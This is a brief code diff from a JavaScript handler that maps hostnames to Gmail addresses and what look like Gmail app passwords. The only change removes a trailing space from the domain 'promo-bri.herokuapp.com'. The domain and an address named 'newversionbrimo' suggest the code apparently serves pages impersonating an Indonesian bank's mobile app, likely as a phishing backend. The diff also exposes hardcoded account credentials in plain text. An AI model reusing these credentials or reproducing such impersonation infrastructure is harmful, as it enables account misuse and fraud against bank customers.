@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim';
 
-    } else if (url == 'promo-bri.herokuapp.com '){
+    } else if (url == 'promo-bri.herokuapp.com'){
         email = 'newversionbrimo@gmail.com';
         pass = 'nlqfdmjhaafozjwv';
 
